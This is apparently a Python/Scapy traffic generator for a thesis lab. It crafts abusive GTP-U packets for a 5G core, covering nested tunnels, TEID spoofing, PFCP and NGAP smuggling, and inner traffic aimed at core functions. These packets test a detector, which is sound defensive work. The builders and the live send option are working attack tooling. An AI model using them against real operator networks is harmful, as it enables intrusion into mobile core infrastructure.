#!/usr/bin/env python3
"""
GTP-U abuse traffic generator  --  ISOLATED LAB TESTBED USE ONLY.

This tool crafts the malformed / abusive GTP-U packets that the detector is
meant to catch. It exists solely to evaluate the detector inside this
self-contained Docker lab (see docker-compose.yml). It targets the lab UPF's
N3 address on the private lab bridge and must never be pointed at any network
you are not authorised to test. Generating these packets against a live
operator is illegal in most jurisdictions.

It can either send live (requires the lab bridge + NET_RAW) or --write a pcap
plus an aligned labels file so the detector can be scored offline with no
privileges at all -- the reproducible path used for thesis metrics.

Abuse classes (mirror the published TU Berlin "Tunneler" taxonomy):
  gtp_in_gtp     nested GTP-U tunnel
  teid_spoof     reuse a victim TEID from a new source
  pfcp_smuggle   PFCP (N4) control message inside GTP-U user data
  ngap_smuggle   SCTP/NGAP inside GTP-U user data
  inner_to_core  inner IP destined at a core NF instead of the data network
  benign         legitimate user-plane traffic (negative samples)
"""
from __future__ import annotations

import argparse
import json
import random

from scapy.all import IP, UDP, ICMP, TCP, Raw, wrpcap
from scapy.contrib.gtp import GTP_U_Header
from scapy.contrib.pfcp import PFCP

PFCP_PORT = 8805
GTPC_PORT = 2123
GTPU_PORT = 2152
SCTP_PROTO = 132


def outer(dst, teid, sport_ip):
    return IP(src=sport_ip, dst=dst) / UDP(sport=GTPU_PORT, dport=GTPU_PORT) / \
           GTP_U_Header(teid=teid)


def mk_benign(upf, teid, gnb, ue_ip="10.45.0.2", dn="8.8.8.8"):
    return outer(upf, teid, gnb) / IP(src=ue_ip, dst=dn) / ICMP()


def mk_gtp_in_gtp(upf, teid, gnb):
    return outer(upf, teid, gnb) / GTP_U_Header(teid=teid) / \
           IP(src="10.45.0.2", dst="10.45.0.1") / ICMP()


def mk_teid_spoof(upf, teid, attacker_ip):
    # same TEID as a benign flow but from a different source IP
    return outer(upf, teid, attacker_ip) / IP(src="10.45.0.2", dst="8.8.8.8") / ICMP()


def mk_pfcp_smuggle(upf, teid, gnb, rng=None):
    # Use the caller's seeded Random when supplied. The module-level random was
    # unseeded, which made an otherwise seeded corpus non-byte-reproducible.
    r = rng if rng is not None else random.Random(0)
    return outer(upf, teid, gnb) / IP(src="10.45.0.2", dst=upf) / \
           UDP(sport=r.randint(1024, 65535), dport=PFCP_PORT) / PFCP()


def mk_ngap_smuggle(upf, teid, gnb):
    # SCTP has proto 132; build a raw SCTP-ish inner packet
    inner = IP(src="10.45.0.2", dst=upf, proto=SCTP_PROTO) / Raw(load=b"\x00" * 16)
    return outer(upf, teid, gnb) / inner


def mk_inner_to_core(upf, teid, gnb, smf):
    return outer(upf, teid, gnb) / IP(src="10.45.0.2", dst=smf) / \
           TCP(dport=80)


BUILDERS = {
    "benign": lambda a: mk_benign(a.upf, a.teid, a.gnb),
    "gtp_in_gtp": lambda a: mk_gtp_in_gtp(a.upf, a.teid, a.gnb),
    "teid_spoof": lambda a: mk_teid_spoof(a.upf, a.teid, a.attacker),
    "pfcp_smuggle": lambda a: mk_pfcp_smuggle(a.upf, a.teid, a.gnb),
    "ngap_smuggle": lambda a: mk_ngap_smuggle(a.upf, a.teid, a.gnb),
    "inner_to_core": lambda a: mk_inner_to_core(a.upf, a.teid, a.gnb, a.smf),
}
MALICIOUS = {k for k in BUILDERS if k != "benign"}


def build_corpus(args):
    """Return (packets, labels) for a mixed benign+malicious corpus."""
    pkts, labels = [], []
    rng = random.Random(args.seed)

    # seed a benign baseline so teid_spoof has an owner to conflict with
    for _ in range(args.benign):
        pkts.append(mk_benign(args.upf, args.teid, args.gnb))
        labels.append(False)

    classes = args.classes.split(",") if args.classes else sorted(MALICIOUS)
    for _ in range(args.count):
        cls = rng.choice(classes)
        pkts.append(BUILDERS[cls](args))
        labels.append(cls in MALICIOUS)

    # shuffle while keeping labels aligned
    order = list(range(len(pkts)))
    rng.shuffle(order)
    pkts = [pkts[i] for i in order]
    labels = [labels[i] for i in order]
    return pkts, labels


def main():
    p = argparse.ArgumentParser(description="GTP-U abuse generator (lab only)")
    p.add_argument("--upf", default="10.10.10.10", help="lab UPF N3 IP")
    p.add_argument("--smf", default="10.10.10.11", help="lab SMF IP (for inner_to_core)")
    p.add_argument("--gnb", default="10.10.10.20", help="lab gNB source IP")
    p.add_argument("--attacker", default="10.10.10.66", help="rogue source IP")
    p.add_argument("--teid", type=lambda x: int(x, 0), default=0x1, help="TEID (hex ok)")

    p.add_argument("--class", dest="single", choices=list(BUILDERS),
                   help="send/write a single abuse class")
    p.add_argument("--classes", help="comma list for corpus mode")
    p.add_argument("--count", type=int, default=200, help="malicious/mixed packets")
    p.add_argument("--benign", type=int, default=200, help="benign baseline packets")
    p.add_argument("--seed", type=int, default=1337)

    p.add_argument("--write", help="write pcap here instead of sending live")
    p.add_argument("--labels-out", help="write aligned labels JSON here")
    p.add_argument("--send", action="store_true", help="send live on the lab bridge")
    p.add_argument("--iface", default="eth1")
    args = p.parse_args()

    if args.single:
        pkt = BUILDERS[args.single](args)
        if args.write:
            wrpcap(args.write, [pkt])
            print(f"[+] wrote 1 x {args.single} -> {args.write}")
        if args.send:
            from scapy.all import send
            # These packets are built IP-rooted (no Ether layer), so they
            # must go out at L3: send() lets the kernel add a real Ethernet
            # header and resolve ARP. sendp() would write the IP bytes
            # straight onto the wire as if they were already a frame.
            send(pkt, iface=args.iface, verbose=True)
        if not args.write and not args.send:
            pkt.show()
        return

    pkts, labels = build_corpus(args)
    if args.write:
        wrpcap(args.write, pkts)
        print(f"[+] wrote {len(pkts)} packets -> {args.write} "
              f"({sum(labels)} malicious / {len(labels)-sum(labels)} benign)")
    if args.labels_out:
        with open(args.labels_out, "w") as fh:
            json.dump(labels, fh)
        print(f"[+] wrote labels -> {args.labels_out}")
    if args.send:
        from scapy.all import send
        print(f"[!] sending {len(pkts)} packets on {args.iface} (lab bridge)")
        send(pkts, iface=args.iface, verbose=False)


if __name__ == "__main__":
    main()
